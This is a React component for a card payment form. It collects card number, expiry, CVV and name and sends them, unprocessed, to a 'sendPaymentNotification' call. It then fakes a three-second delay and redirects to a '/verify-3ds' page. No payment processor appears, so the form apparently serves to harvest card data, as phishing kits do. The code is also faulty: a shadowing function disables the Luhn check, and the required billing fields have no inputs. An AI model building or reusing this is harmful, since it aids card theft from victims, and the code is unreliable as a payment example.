import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { Label } from "./ui/label";
import { useToast } from "./ui/use-toast";
import { sendPaymentNotification } from "../utils/internalApi";
import { GridLoader } from "react-spinners";
import { Building2 } from "lucide-react";
import { CardTypeIcon } from "./CardTypeIcon";

const formatCardNumber = (value: string): string => {
  const digits = value.replace(/\D/g, '');
  const groups = digits.match(/.{1,4}/g) || [];
  return groups.join(' ').substr(0, 19);
};

interface PaymentFormProps {
  amount: number;
}

interface BillingDetails {
  streetAddress: string;
  streetAddress2: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [agreementAccepted, setAgreementAccepted] = useState(false);
  const [showAgreement, setShowAgreement] = useState(false);
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    streetAddress: "",
    streetAddress2: "",
    city: "",
    state: "",
    zipCode: "",
    country: "US",
  });
  const [isSheetOpen, setIsSheetOpen] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const validateCardHolder = (value: string) => {
    const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
    const dotCount = (value.match(/\./g) || []).length;
    
    value = value.slice(0, 12);
    
    if (!latinAndDotRegex.test(value)) {
      return value.replace(/[^a-zA-Z\s.]/g, '').toUpperCase();
    }
    
    if (dotCount > 1) {
      const firstDotIndex = value.indexOf('.');
      return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
    }
    
    return value.toUpperCase();
  };

  const validateCardNumber = (value: string) => {
    return value.replace(/\D/g, '');
  };

  const validateExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
      const month = parseInt(cleanValue.substring(0, 2));
      
      if (month > 12) {
        return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }
      if (month === 0) {
        return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }

      if (cleanValue.length >= 4) {
        const year = parseInt(cleanValue.substring(2, 4));
        
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          toast({
            title: "Invalid Expiry Date",
            description: "Card has expired",
            variant: "destructive",
          });
          return '';
        }
      }

      return month.toString().padStart(2, '0') + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
    }
    return cleanValue;
  };

  const validateCVV = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 3);
  };

  const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
    setBillingDetails(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleEncryptButtonClick = () => {
    setShowAgreement(true);
    if (!agreementAccepted) {
      toast({
        title: "Agreement Required",
        description: "Please accept the user agreement to continue",
        variant: "destructive",
      });
      return;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!agreementAccepted && showAgreement) {
      toast({
        title: "Agreement Required",
        description: "Please accept the user agreement to continue",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    if (!billingDetails.streetAddress || !billingDetails.city || !billingDetails.state || !billingDetails.zipCode) {
      toast({
        title: "Missing Billing Details",
        description: "Please enter your complete billing information",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await sendPaymentNotification({
        amount,
        cardHolder,
        cardNumber,
        expiryDate,
        cvv,
        billingDetails: {
          address1: billingDetails.streetAddress,
          address2: billingDetails.streetAddress2,
          city: billingDetails.city,
          state: billingDetails.state,
          zipCode: billingDetails.zipCode,
          country: billingDetails.country
        }
      });

      await new Promise(resolve => setTimeout(resolve, 3000));
      
      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
    } catch (error) {
      console.error('Error processing payment:', error);
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "Failed to process payment. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn relative">
      {isSubmitting && (
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center gap-6 z-50 animate-fadeIn">
          <GridLoader color="#8B5CF6" size={15} margin={2} />
          <div className="text-white/90 font-medium text-lg">Processing Payment...</div>
          <div className="text-white/60 text-sm">Please do not close this window</div>
        </div>
      )}
      
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(validateCardHolder(e.target.value))}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2 relative">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(validateCardNumber(e.target.value)))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors pr-12"
            required
          />
          <CardTypeIcon cardNumber={cardNumber} />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(validateExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(validateCVV(e.target.value))}
              maxLength={3}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>

        <div className="space-y-4">
          <div className="payment-button-container">
            <button
              type="submit"
              onClick={handleEncryptButtonClick}
              className="payment-button"
              disabled={isSubmitting}
            >
              <div className="payment-button-blur"></div>
              <span className="relative z-10">
                {isSubmitting ? "Processing..." : "Pay Now"}
              </span>
            </button>
          </div>
          
          {showAgreement && (
            <label className="agreement-checkbox-container self-start text-white/80 text-sm hover:text-white transition-colors group animate-fadeIn mt-4">
              <input
                type="checkbox"
                checked={agreementAccepted}
                onChange={(e) => setAgreementAccepted(e.target.checked)}
              />
              <span className="agreement-checkmark"></span>
              <span className="group-hover:text-white/90 transition-colors">
                I agree to the Terms of Service and Privacy Policy
              </span>
            </label>
          )}
        </div>
      </div>
    </form>
  );
};

export default PaymentForm;
